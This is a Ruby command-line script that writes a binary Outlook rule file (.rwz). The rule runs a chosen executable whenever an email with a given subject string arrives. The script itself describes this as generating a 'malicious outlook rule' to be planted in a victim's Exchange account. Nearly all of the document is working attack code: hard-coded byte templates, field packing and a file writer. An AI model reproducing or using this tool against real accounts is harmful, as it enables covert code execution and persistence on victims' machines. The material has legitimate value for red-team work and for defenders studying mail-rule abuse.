#!/usr/bin/ruby
#encoding: ASCII-8BIT

require 'ostruct'
require 'thor'

class Rule

	attr_accessor :name, :subject_trigger, :executable_path, :assembled, :template

	def initialize(name: nil, subject_trigger: nil, executable_path: nil, assembled: nil)

		@name = name
		@subject_trigger = subject_trigger
		@executable_path = executable_path
		@assembled = assembled	

		template = {

			rule_name: 	nil,
			subject_trigger: nil,
			exe_path: nil,
			pre_rule_name:
				"\x00\x00\x14\x00\x00\x00\x14\x06\x00\x00\x00\x00\x00\x00\x00\x00"+
				"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
				"\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"+
				"\x14\x00",
			pre_subject_trigger:
				"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00"+
				"\x00\x00\x00\x00\x88\x00\x00\x00\x05\x00\xFF\xFF\x00\x00\x0C\x00"+
				"\x43\x52\x75\x6C\x65\x45\x6C\x65\x6D\x65\x6E\x74\x90\x01\x00\x00"+
				"\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x80\x64\x00"+
				"\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x80"+
				"\xCF\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
			pre_executable_path:
				"\x01\x80\x49\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00",
			remaining:
				"\x01\x80\x2D\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
				"\x00\x00\x3F\xE9\x93\x3E\xAC\xD8\xE4\x40\x00\x00\x00\x00"
		}

		@template = OpenStruct.new(template)

	end

	def write_rule(filename)
		File.open(filename,'w+b') { |f| f.print(@assembled) }
	end

	def utf_pad(s)

		s.split('')
		 .map! {|c| c + "\x00"}
		 .join('')

	end

	def pack_size_field(s)

		s = s.bytesize.to_s(16)

		unless s.length > 1
			s = ["0" + s].pack('H2')
		else
			s = [s].pack('H2')
		end

		return s

	end

	def gen_section(s)

		return (pack_size_field(s)+utf_pad(s))

	end

	def assemble()

		# Rule name
		@assembled  = @template.pre_rule_name
		@assembled += gen_section(@name)

		# Subject trigger
		@assembled += @template.pre_subject_trigger
		@assembled += gen_section(@subject_trigger)

		# Executable path
		@assembled += @template.pre_executable_path
		@assembled += gen_section(@executable_path)

		# Remaining template
		@assembled += @template.remaining

	end

end

class CLI < Thor

	description = "Generate a malicious outlook rule. The rule should be deployed in the victim's Exchange account via OWA or Outlook and is then synchronized via Outlook so long as the victim's account is logged in."

	desc "generate", description
	option :rule_name,{required:true, desc: "Name for the rule, as it will will appear in Outlook and OWA.", aliases: [:rname]}
	option :subject_trigger, {required:true, desc: "String appearing in the subject line that triggers execution of the rule1."}
	option :executable_path, {required:true, desc: "Path to the executable file."}
	option :file_name, {required:true, desc: "Name of the file that the rule will be written to."}

	def generate()

		# Create the rule
		rule = Rule.new
		rule.name = options[:rule_name]
		rule.subject_trigger = options[:subject_trigger]
		rule.executable_path = options[:executable_path]

		# Assemble the rule
		rule.assemble()

		# Create and write the rule file
		rwz = options[:file_name].dup
		rwz.gsub!(/\.rwz/i,'')

		rule.write_rule(rwz+".rwz")

		puts
		puts "[+]  Rule file written to #{rwz}.rwz...exiting"
		puts

	end

end

CLI.start(ARGV)